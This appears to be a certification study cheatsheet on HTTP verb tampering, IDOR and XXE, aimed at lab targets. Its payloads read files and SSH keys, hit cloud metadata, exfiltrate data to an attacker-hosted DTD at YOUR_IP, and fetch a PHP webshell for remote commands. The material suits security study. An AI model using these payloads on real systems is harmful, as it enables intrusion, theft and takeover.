---
title: "CWES Cheatsheet — Web Attacks"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, web-attacks, idor, xxe, http-verb-tampering]
---

this section covers HTTP verb tampering, IDOR, and XXE — three classic web attack techniques. different mechanisms, but all very common in real-world apps and CTFs.

---

## HTTP Verb Tampering

web servers accept different HTTP methods (GET, POST, PUT, DELETE, etc.). if the app only blocks certain methods (like GET/POST) for admin pages, you can bypass by using a different method.

### HTTP Methods

| Method | What It Does |
|---|---|
| `GET` | retrieve data |
| `POST` | submit data |
| `HEAD` | same as GET but returns headers only |
| `PUT` | upload/replace a file or resource |
| `DELETE` | delete a resource |
| `PATCH` | partially modify a resource |
| `OPTIONS` | show which methods are allowed |
| `TRACE` | echo back the request (debugging) |
| `CONNECT` | create a tunnel (proxy) |

### How to Exploit

scenario: `/admin/reset.php` shows "403 Forbidden" on GET request.

```bash
# Step 1: Check which methods are allowed
curl -X OPTIONS http://target.htb/admin/reset.php -v
# Look for: Allow: GET, POST, HEAD, OPTIONS

# Step 2: Try each method to bypass the 403
curl -X GET http://target.htb/admin/reset.php
curl -X POST http://target.htb/admin/reset.php
curl -X HEAD http://target.htb/admin/reset.php
curl -X PUT http://target.htb/admin/reset.php
curl -X PATCH http://target.htb/admin/reset.php
curl -X DELETE http://target.htb/admin/reset.php
curl -X TRACE http://target.htb/admin/reset.php

# Step 3: Try with arbitrary/made-up method
curl -X FOOBAR http://target.htb/admin/reset.php
```

why this works: Apache/Nginx config might block GET and POST but forget to block HEAD, PUT, or others. some configs only block specific methods — an unknown method like `FOOBAR` might bypass the filter entirely.

**In Burp:**

```
1. Capture the request to the blocked page
2. Send to Repeater
3. Change GET to HEAD, PUT, PATCH, OPTIONS, FOOBAR
4. Send each one → look for 200 OK instead of 403
```

### Bypass Authentication with Verb Tampering

```bash
# Page requires login via GET
curl http://target.htb/admin/config.php
# → 401 Unauthorized

# Try POST instead
curl -X POST http://target.htb/admin/config.php
# → 200 OK (auth bypassed!)

# Try HEAD
curl -X HEAD http://target.htb/admin/config.php -v
# → 200 OK (check headers for info)
```

### Bypass Security Filters with Verb Tampering

```bash
# XSS blocked on GET
GET /search?query=<script>alert(1)</script>  → blocked by WAF

# Try same payload via POST
POST /search
Content-Type: application/x-www-form-urlencoded
query=<script>alert(1)</script>              → might bypass WAF

# SQLi blocked on POST
POST /login  username=admin'-- -             → blocked

# Try via GET
GET /login?username=admin'-- -               → might bypass
```

> if a WAF blocks your payload, try switching the HTTP method. WAFs often only filter one method.
{: .prompt-tip }

---

## IDOR (Insecure Direct Object Reference)

the app uses IDs (numbers, filenames, etc.) to access data, but doesn't check if YOU should have access to that data. change the ID and access someone else's data.

### Where to Find IDORs

| Location | Example | What to Do |
|---|---|---|
| URL parameter | `/profile?id=123` | change to `?id=124`, `?id=1`, `?id=0` |
| URL path | `/api/users/123/documents` | change `123` to other numbers |
| POST body | `{"user_id": 123}` | change in Burp |
| Cookie | `Cookie: user=123` | change cookie value |
| Header | `X-User-ID: 123` | change header value |
| File parameter | `/download?file=report_123.pdf` | change to `report_124.pdf` |
| AJAX/API calls | check Network tab in DevTools | look for IDs in background requests |

### Basic IDOR Testing

```bash
# Profile page shows your data
GET /api/profile?id=100    → your profile

# Change ID to see other users
GET /api/profile?id=101    → another user's profile
GET /api/profile?id=1      → possibly admin
GET /api/profile?id=0      → sometimes admin or error with info
```

### IDOR in API Endpoints

```bash
# Your documents
GET /api/users/100/documents

# Other users' documents
GET /api/users/101/documents
GET /api/users/1/documents

# Try modifying other users' data
PUT /api/users/101/profile
{"email": "hacker@evil.com"}

# Try deleting other users' data
DELETE /api/users/101/documents/1
```

### IDOR with Encoded/Hashed IDs

some apps encode or hash the ID to make it harder to guess.

```bash
# Base64 encoded ID
GET /profile?id=MTAw    # base64 of "100"

# Decode it
echo MTAw | base64 -d   # → 100

# Encode next ID
echo -n 101 | base64    # → MTAx

# Try it
GET /profile?id=MTAx    # base64 of "101"
```

```bash
# MD5 hashed ID
GET /profile?id=f899139df5e1059396431415e770c6dd    # md5 of "100"

# Generate MD5 for other IDs
echo -n 101 | md5sum    # → output: 5f3c...
echo -n 1 | md5sum      # → output: c4ca...

# Try them
GET /profile?id=5f3c...
GET /profile?id=c4ca...
```

### Fuzzing IDORs with ffuf

```bash
# Fuzz numeric IDs
seq 1 1000 > ids.txt
ffuf -u http://target.htb/api/profile?id=FUZZ -w ids.txt \
  -H "Cookie: session=YOUR_SESSION" -fs <default_size>

# Fuzz with Burp Intruder
# Set payload position on the ID
# Use Numbers payload: 1-1000, step 1
# Look for different response sizes = valid users
```

### IDOR + Privilege Escalation

```bash
# Step 1: Login as normal user, note your ID (e.g., id=50)
# Step 2: Find admin functions in the app
# Step 3: Try calling admin functions with your session

# Example: Admin can create users
POST /api/admin/create-user
Cookie: session=YOUR_NORMAL_SESSION
{"username": "hacker", "role": "admin"}

# Example: Admin can change roles
PUT /api/users/50/role
Cookie: session=YOUR_NORMAL_SESSION
{"role": "admin"}
```

> IDOR isn't just reading data. try: changing data (PUT), deleting data (DELETE), accessing admin functions, and changing your own role.
{: .prompt-tip }

---

## XXE (XML External Entity) Injection

### Identify XXE

look for:
- forms that send XML in Burp (check Content-Type: application/xml)
- API endpoints accepting XML
- SOAP web services
- file uploads (SVG, DOCX, XML)
- JSON endpoints that might also accept XML
- RSS feed parsers

some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. even if a web app sends requests in JSON format, try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML. if the web application accepts the request with XML data, then you can test it against XXE vulnerabilities.

### Convert JSON to XML

```bash
# Original JSON request:
POST /api/submit HTTP/1.1
Content-Type: application/json

{"name": "test", "email": "test@test.com"}

# Try changing to XML:
POST /api/submit HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name>test</name>
  <email>test@test.com</email>
</root>
```

### Test if XXE Works

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY test "XXE_TEST_STRING">
]>
<root>
  <name>test</name>
  <email>&test;</email>
</root>
```

if response shows "XXE_TEST_STRING" — XXE confirmed, proceed to external entities. if response shows `&test;` as raw text — XXE blocked, entities not processed.

> if the XML input had no DTD being declared within the XML data itself, or being referenced externally, add a new DTD before defining your entity. if the DOCTYPE was already declared in the XML request, just add the ENTITY element to it.
{: .prompt-info }

> check which element gets displayed in the response. put `&xxe;` in THAT element. for example if `<email>` value is reflected back to you, inject into `<email>&xxe;</email>`.
{: .prompt-info }

### XXE in Burp

```
1. Find a request that sends XML (or change Content-Type to application/xml)
2. In Burp Repeater, add DTD before the root element:
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
3. Replace a value in the XML with &xxe;
4. Send → check response for file contents
```

**Example — original request:**

```xml
POST /api/submit HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<order>
  <item>Hat</item>
  <quantity>1</quantity>
</order>
```

**Modified with XXE:**

```xml
POST /api/submit HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```

---

### Basic XXE — Read Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <data>&xxe;</data>
</root>
```

> in certain Java web applications, you may be able to specify a directory instead of a file, and get a directory listing instead — useful for locating sensitive files.
{: .prompt-info }

**Files to read first:**

```bash
file:///etc/passwd              # Users list
file:///etc/hosts               # Internal hostnames
file:///var/www/html/config.php # DB creds (may fail due to special chars → use CDATA or base64)
file:///home/user/.ssh/id_rsa   # SSH key
```

**How it works:**

```
1. <!DOCTYPE foo [ ... ]> → defines a DTD (Document Type Definition)
2. <!ENTITY xxe SYSTEM "file:///etc/passwd"> → creates entity named "xxe"
   that reads /etc/passwd
3. <data>&xxe;</data> → when XML is parsed, &xxe; is replaced with
   contents of /etc/passwd
```

---

### XXE — Read PHP Source Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<root>
  <data>&xxe;</data>
</root>
```

```bash
# Decode the base64 output
echo "BASE64_OUTPUT" | base64 -d
```

why base64: reading PHP files directly would execute them. base64 encoding prevents execution and gives you the source code.

**Files to read with base64:**

```bash
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=db.php
php://filter/convert.base64-encode/resource=login.php
php://filter/convert.base64-encode/resource=upload.php
```

> this trick only works with PHP web applications. the CDATA method below is a more advanced method for reading source code, which should work with any web framework.
{: .prompt-info }

---

### XXE — SSRF (hit internal services)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<root>
  <data>&xxe;</data>
</root>
```

**AWS metadata:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>
  <data>&xxe;</data>
</root>
```

---

### Advanced XXE — CDATA Exfiltration (Any Framework)

when `php://filter` isn't available (not PHP) or files have special characters that break XML. wraps file content in CDATA tags so XML parser treats it as raw data.

**Step 1: Create `xxe.dtd` on your Kali:**

```
<!ENTITY joined "%begin;%file;%end;">
```

**Step 2: Host it:**

```bash
python3 -m http.server 8000
```

**Step 3: Send this payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
  <email>&joined;</email>
</root>
```

**What happens:**

```
1. %begin; = <![CDATA[
2. %file;  = contents of submitDetails.php (with special chars like < > &)
3. %end;   = ]]>
4. Your xxe.dtd joins them: &joined; = <![CDATA[ FILE_CONTENTS ]]>
5. XML parser treats everything inside CDATA as raw text → no breaking
6. File contents displayed in response
```

> why external DTD is needed: XML prevents joining internal and external entities in the same DTD. by hosting the join on your server, all entities are treated as external so the join works.
{: .prompt-info }

> in some modern web servers, you may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (XML entity reference loop).
{: .prompt-warning }

---

### Blind XXE — Out-of-Band (OOB) Exfiltration

when the server processes XML but doesn't show the entity value in the response.

**Step 1: Create DTD file on your Kali (save as `evil.dtd`):**

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
```

**Step 2: Create auto-decode listener (save as `index.php` on Kali):**

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**Step 3: Host with PHP server:**

```bash
php -S 0.0.0.0:8000
```

**Step 4: Send payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Check Listener:**

```
php -S 0.0.0.0:8000

10.10.10.50:46256 Accepted
10.10.10.50:46256 [200]: (null) /xxe.dtd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Alternative — simpler listener without auto-decode:**

```bash
python3 -m http.server 8000

# You'll see base64 in the URL:
# GET /?content=cm9vdDp4OjA6MC... HTTP/1.0

# Manually decode
echo "cm9vdDp4OjA6MC..." | base64 -d
```

> you may also utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for your URL (e.g. `ENCODEDTEXT.our.website.com`), and then use `tcpdump` to capture incoming traffic and decode the sub-domain string.
{: .prompt-info }

---

### Blind XXE — Error-Based

server processes XML but doesn't display any entity values. however, it DOES show PHP/XML error messages. we abuse error messages to leak file contents.

**Step 1: Confirm errors are shown:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <email>&nonExistingEntity;</email>
</root>
```

if you see an error message — error-based XXE is possible.

**Step 2: Create `xxe.dtd` on your Kali:**

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**Step 3: Host it:**

```bash
python3 -m http.server 8000
```

**Step 4: Send payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root>
  <email>&content;</email>
</root>
```

**What happens:**

```
1. Server loads your xxe.dtd
2. %file; reads /etc/hosts
3. %error; creates entity referencing %nonExistingEntity; (doesn't exist)
4. Server throws error: "Entity 'nonExistingEntity' not found" + /etc/hosts content
5. Error message CONTAINS the file contents → you read the file through errors
```

> this method may also be used to read source code of files. however, it may have length limitations, and certain special characters may still break it.
{: .prompt-warning }

---

### XXE via File Upload (SVG, DOCX)

```xml
<!-- SVG — read file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<!-- SVG — read PHP source -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> ]>
<svg>&xxe;</svg>

<!-- SVG — SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<svg>&xxe;</svg>
```

**For DOCX XXE:** unzip docx, inject DTD in `word/document.xml`, rezip.

---

### Automated XXE — XXEinjector

```bash
# Install
git clone https://github.com/enjoiz/XXEinjector.git
```

**Step 1: Save HTTP request from Burp to a file. Replace XML body with XXEINJECT marker:**

```
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: text/plain;charset=UTF-8
Content-Length: 169

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 2: Run the tool:**

```bash
ruby XXEinjector.rb --host=YOUR_IP --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

**Step 3: Check results:**

```bash
cat Logs/TARGET_IP/etc/passwd.log
```

the tool handles DTD hosting, encoding, and exfiltration automatically. saves time on blind XXE.

---

### XXE to RCE (Rare)

possible but requires `expect` PHP extension (not installed by default).

**Direct command:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>
  <email>&xxe;</email>
</root>
```

**Download webshell from your server:**

```bash
# Step 1: Host shell
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<!-- Step 2: Send payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'YOUR_IP/shell.php'">
]>
<root>
  <email>&xxe;</email>
</root>
```

```bash
# Step 3: Access shell
curl "http://TARGET/shell.php?cmd=whoami"
```

> we replaced all spaces with `$IFS` to avoid breaking XML syntax. many other characters like `|`, `>`, and `{` may also break the code, so avoid using them.
{: .prompt-info }

> the `expect` module is not enabled/installed by default on modern PHP servers, so this attack may not always work. this is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.
{: .prompt-warning }

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
